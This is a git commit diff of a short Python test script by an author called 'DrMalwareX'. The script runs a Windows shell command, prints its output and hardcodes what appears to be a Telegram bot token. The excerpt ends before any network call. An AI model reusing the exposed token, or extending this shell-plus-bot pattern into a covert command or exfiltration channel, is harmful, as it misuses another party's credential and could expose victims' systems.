7526b991c319500adbd9ba86bc5472ad02534bea
DrMalwareX <89261482+DrMalwareX@users.noreply.github.com>
2021-08-24 07:40:50 +0300

    Update test.py

--- test.py
+++ test.py
@@ -1,8 +1,8 @@
 import traceback
-from subprocess import Popen,PIPE
+import subprocess
 import requests
 try:
-    sub = Popen(["cmd.exe","/c","dir"],stdout=PIPE,stderr=PIPE,stdin=PIPE,shell=True)
+    sub = subprocess.Popen(["cmd.exe","/c","dir"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE,shell=True)
     output = sub.communicate()[0]
     print(output)
     token = "1951689247:AAGNnZkRBIYIQUW7t8sDgxjLeu0fO-HHfWI"
